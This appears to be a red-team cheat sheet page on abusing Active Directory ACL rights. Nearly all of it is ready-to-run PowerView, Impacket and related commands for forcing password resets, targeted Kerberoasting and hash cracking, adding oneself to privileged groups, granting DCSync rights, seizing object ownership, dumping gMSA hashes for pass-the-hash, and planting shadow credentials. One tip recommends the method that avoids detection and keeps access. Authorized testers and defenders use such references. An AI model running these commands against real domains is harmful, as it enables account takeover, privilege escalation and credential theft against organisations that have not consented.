# ACL Abuse

!!! tip "Tip"
    BloodHound is the authoritative source for ACL paths — it resolves nested group memberships and converts control rights (WriteDACL, GenericAll, GenericWrite, AddMember, ForceChangePassword, WriteOwner, AllExtendedRights) into actionable attack edges. Don't manually enumerate ACLs domain-wide; target specific objects after BloodHound points you at them.

---

## Enumerate ACLs (PowerView dev branch)

```powershell
Import-Module .\PowerView.ps1

# All ACLs on a target
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | FT SecurityIdentifier,ActiveDirectoryRights,ObjectAceType

# Only interesting rights
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|AllExtendedRights' }

# SID → name
ConvertFrom-SID S-1-5-21-1987370270-658905905-1781884369-1104

# What does <user> have rights over?
Get-DomainObjectAcl -ResolveGUIDs -Identity * | ? { $_.SecurityIdentifier -eq (ConvertTo-SID <user>) }
```

---

## GenericAll / GenericWrite on a User

### Force a password reset

```powershell
$SecPass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity target_user -AccountPassword $SecPass
```

From Linux:

```bash
net rpc password target_user 'NewPass123!' -U 'example.com/<attacker>%<pass>' -S 10.10.10.10
```

### Targeted Kerberoasting (GenericWrite only)

If you can't reset the password, set an SPN on the account, request its TGS, crack it:

```powershell
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='fake/spn'}
```

```bash
impacket-GetUserSPNs example.com/<attacker>:<pass> -dc-ip 10.10.10.10 -request -outputfile tgs.hash
hashcat -m 13100 tgs.hash rockyou.txt
```

Then clear the SPN to clean up:

```powershell
Set-DomainObject -Identity target_user -Clear serviceprincipalname
```

---

## GenericAll on a Group

Add yourself as a member:

```powershell
Add-DomainGroupMember -Identity "Target Group" -Members <attacker>
```

From Linux:

```bash
net rpc group addmem "Target Group" <attacker> -U 'example.com/<user>%<pass>' -S 10.10.10.10
```

---

## WriteDACL on the Domain — Grant DCSync

With `WriteDACL` on the root domain object, grant yourself replication rights:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=example,DC=com" -PrincipalIdentity <attacker> -Rights DCSync
```

Then run DCSync — see [DCSync](dcsync.md).

From Linux (`dacledit.py` from Impacket, recent versions):

```bash
dacledit.py -action write -rights DCSync -principal <attacker> -target-dn 'DC=example,DC=com' example.com/<user>:'<pass>' -dc-ip 10.10.10.10
```

---

## WriteOwner on an Object

Take ownership first, then grant yourself full control:

```powershell
Set-DomainObjectOwner -Identity target_user -OwnerIdentity <attacker>
Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity <attacker> -Rights All
```

From Linux:

```bash
owneredit.py -action write -new-owner <attacker> -target target_user example.com/<user>:'<pass>' -dc-ip 10.10.10.10
dacledit.py -action write -rights FullControl -principal <attacker> -target target_user example.com/<user>:'<pass>' -dc-ip 10.10.10.10
```

---

## ForceChangePassword Extended Right

A targeted form of password reset — doesn't require knowing the old password.

```powershell
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

---

## ReadGMSAPassword — Retrieve gMSA Password

Group Managed Service Accounts (gMSA) store their password in a special LDAP attribute. If your user or a group you're in has read access, retrieve and use the NTLM hash:

```bash
nxc ldap 10.10.10.10 -u <user> -p '<pass>' --gmsa

# Or with gMSADumper
gMSADumper.py -u <user> -p '<pass>' -d example.com
```

The returned NTLM hash can be used directly for pass-the-hash against services the gMSA controls.

---

## Shadow Credentials (msDS-KeyCredentialLink)

Modern alternative to password reset — works when you have GenericWrite/GenericAll on a user or computer and the domain has Kerberos PKI enabled (any DC running Windows Server 2016+ that supports [PKINIT](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)). You add a certificate to `msDS-KeyCredentialLink`, then use it to request a TGT.

### With pywhisker (Linux)

```bash
pywhisker.py -d example.com -u <attacker> -p '<pass>' --target target_user --action add
```

This drops a `.pfx` file. Use it with PKINITtools:

```bash
gettgtpkinit.py -cert-pfx target_user.pfx -pfx-pass '<pfx-password>' example.com/target_user target_user.ccache
export KRB5CCNAME=target_user.ccache
```

Then use the TGT to get the NT hash via U2U:

```bash
getnthash.py -key <as-rep-key> example.com/target_user
```

### With Whisker (Windows)

```powershell
.\Whisker.exe add /target:target_user
# Follow Rubeus asktgt command emitted by Whisker
```

!!! tip "When to use Shadow Credentials over password reset"
    Resetting a user's password locks them out and gets noticed immediately. Shadow Credentials add a cert without changing the password — the user keeps working, you keep access. Much quieter for real engagements.

---

## AddSelf — Add Yourself to a Group

If you have `Self` + `Member` write rights on a group, add yourself without needing `GenericAll`:

```powershell
Add-DomainGroupMember -Identity "Target Group" -Members <attacker>
```
